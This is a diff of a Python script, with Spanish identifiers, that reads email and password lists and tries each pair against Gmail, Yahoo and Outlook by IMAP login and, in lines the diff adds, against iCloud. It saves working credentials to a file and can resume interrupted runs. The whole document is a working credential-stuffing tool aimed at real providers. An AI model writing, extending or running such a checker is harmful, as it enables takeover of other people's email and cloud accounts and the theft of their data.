@@ -4,35 +4,45 @@ import sys
 import threading
 import imaplib
 import smtplib
+from pyicloud import PyiCloudService
 from eliminar import eliminarRepetidos
-
+import signal
 
 def checklogin(email, contra, f, num):
     num[0] += 1
     posC = email.find("@gmail.com")
     posY = email.find("@yahoo.com")
-    if posC != -1:
-        if (checkLoginGmail(email, contra)):
-            print("Exito G :) email:{0} password:{1}".format(email, contra))
-            f.write("\nemail:{0} password:{1}".format(email, contra))
+    if "--icloud" in sys.argv:
+        if(checkLoginiCloud(email,contra)):
+            print("Exito iCloud :) email:{0} password:{1}".format(email, contra))
+            f.write("\niCloud email:{0} password:{1}".format(email, contra))
         else:
             pass
             print("no Exito :( email:{0} password:{1}".format(email, contra))
-    elif posY != -1:
-        if (checkLoginYahoo(email, contra)):
-            print("Exito Y :) email:{0} password:{1}".format(email, contra))
-            f.write("\nemail:{0} password:{1}".format(email, contra))
+
+    if "--email" in sys.argv:
+        if posC != -1:
+            if (checkLoginGmail(email, contra)):
+                print("Exito G :) email:{0} password:{1}".format(email, contra))
+                f.write("\nemail:{0} password:{1}".format(email, contra))
+            else:
+                pass
+                print("no Exito :( email:{0} password:{1}".format(email, contra))
+        elif posY != -1:
+            if (checkLoginYahoo(email, contra)):
+                print("Exito Y :) email:{0} password:{1}".format(email, contra))
+                f.write("\nemail:{0} password:{1}".format(email, contra))
+            else:
+                pass
+                print("no Exito :( email:{0} password:{1}".format(email, contra))
         else:
-            pass
-            print("no Exito :( email:{0} password:{1}".format(email, contra))
-    else:
-        if (checkLoginMS(email, contra)):
-            print("Exito M :) email:{0} password:{1}".format(email, contra))
-            f.write("\nemail:{0} password:{1}".format(email, contra))
-        else:
-            pass
-            print("no Exito :( email:{0} password:{1}".format(email, contra))
-    num[0] -= 1
+            if (checkLoginMS(email, contra)):
+                print("Exito M :) email:{0} password:{1}".format(email, contra))
+                f.write("\nemail:{0} password:{1}".format(email, contra))
+            else:
+                pass
+                print("no Exito :( email:{0} password:{1}".format(email, contra))
+        num[0] -= 1
 
 
 def checkLoginYahoo(email, contra):
@@ -61,6 +71,7 @@ def checkLoginGmail(email, contra):
 		return False
 
 
+
 def checkLoginMS(email, contra):
     server = imaplib.IMAP4_SSL("imap-mail.outlook.com", 993)
     try:
@@ -69,11 +80,29 @@ def checkLoginMS(email, contra):
     except:
         return False
 
+def checkLoginiCloud(email,contra):
+    try:
+        icloud = PyiCloudService(email,contra)
+        return True
+    except:
+        return False
+
+salida = False
+
+def salir(signum, frame):
+    global salida
+    salida = True
+    sys.exit()
+ 
+signal.signal(signal.SIGINT, salir)
+
 
 if __name__ == "__main__":
-    save = sys.argv[2]+".sav"
-    inputTXT = sys.argv[1]
-    outputTXT = sys.argv[2]+".txt"
+    if "-O" in sys.argv:
+        save = sys.argv[sys.argv.index("-O") + 1]+".sav"
+        outputTXT = sys.argv[sys.argv.index("-O") + 1]+".txt"
+    if "-I" in sys.argv:
+        inputTXT = sys.argv[sys.argv.index("-I") + 1]
     flag = True
     lineaSav = None
     if os.path.isfile(save):
@@ -95,30 +124,33 @@ if __name__ == "__main__":
     num = [0]
     for linea in lineas:
         try:
-            if flag and linea != "":
-                lineaRaw = linea
-                linea = linea.split(',')
-                email = linea[0]
-                contras = linea[1:]
-                if len(contras) > 1:
-                    if linea[1] not in linea[2:]:
-                        for contra in contras:
+            if salida == False:
+                if flag and linea != "":
+                    lineaRaw = linea
+                    linea = linea.split(',')
+                    email = linea[0]
+                    contras = linea[1:]
+                    if len(contras) > 1:
+                        if linea[1] not in linea[2:]:
+                            for contra in contras:
+                                checklogin(email, contra, datos, num)
+                        else:
+                            contra = linea[1]
                             checklogin(email, contra, datos, num)
                     else:
                         contra = linea[1]
                         checklogin(email, contra, datos, num)
-                else:
-                    contra = linea[1]
-                    checklogin(email, contra, datos, num)
-                sav = open(save, "w")
-                sav.write(lineaRaw)
-                sav.close()
-            if linea == lineaSav and linea != "":
-                flag = True
+                    sav = open(save, "w")
+                    sav.write(lineaRaw)
+                    sav.close()
+                if linea == lineaSav and linea != "":
+                    flag = True
+            else:
+                break
         except Exception as e:
             print("Excepcion Dura "+str(e))
         finally:
             lineasActuales += 1
-            #print("%{0}".format(float((100/numLineas)*lineasActuales)))
+            print("%{0}".format(float((100/numLineas)*lineasActuales)))
     eliminarRepetidos(inputTXT)
     eliminarRepetidos(outputTXT)
